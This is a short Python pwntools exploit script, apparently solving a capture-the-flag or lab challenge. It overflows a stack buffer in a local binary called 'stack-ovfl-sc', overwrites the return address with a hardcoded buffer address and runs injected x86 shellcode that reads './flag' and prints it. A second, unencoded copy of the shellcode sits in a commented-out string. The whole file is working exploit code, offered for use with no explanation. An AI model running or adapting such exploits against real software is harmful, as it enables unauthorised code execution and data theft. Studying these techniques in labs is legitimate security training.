#!/usr/bin/env python
from pwn import	*

offset = 136
buffer_addr = 0xffffd414
p = process("./stack-ovfl-sc")


# Reads file at './flag' and writes to stdout
buf =  b""
buf += b"\xba\x42\x73\xbb\x45\xda\xd0\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x12\x31\x56\x12\x83\xee\xfc\x03\x14\x7d\x59"
buf += b"\xb0\x73\xb7\x25\x3e\x83\xb8\x55\x1a\xb2\x71\x98\x1c"
buf += b"\x3d\x42\x9b\x1e\x3d\x45\xdc\xa9\xda\xcc\x25\x13\x24"
buf += b"\xdf\xd5\x64\xe9\x5f\x5c\xa6\x49\x5b\x5f\x27\xa9\xdf"
buf += b"\x5e\x27\xa9\x1f\xac\xa7\x11\x1e\x2e\xa8\x61\x9a\x2e"
buf += b"\xa8\x61\xdc\xe3\x28\x89\x19\x04\xd7\xb6\x8c\xd4\x4e"
buf += b"\x24\xb0\x4d\x8f"
'''
buf =  b""
buf += b"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89"
buf += b"\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10"
buf += b"\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01"
buf += b"\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00"
buf += b"\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2e\x2f\x66\x6c"
buf += b"\x61\x67\x00"
'''

p.sendline(buf + "A"*(offset - len(buf)) + p32(buffer_addr))
p.interactive()
